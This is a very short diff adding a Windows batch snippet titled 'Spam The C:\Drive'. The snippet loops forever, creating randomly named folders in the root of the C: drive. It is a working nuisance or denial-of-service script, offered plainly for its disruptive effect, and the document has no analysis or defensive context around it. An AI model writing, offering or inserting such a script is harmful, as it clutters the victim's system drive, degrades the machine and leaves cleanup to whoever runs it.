@@ -1,0 +1,6 @@
+Spam The C:\Drive:
+
+
+:loop
+mkdir C:\%random%
+goto loop
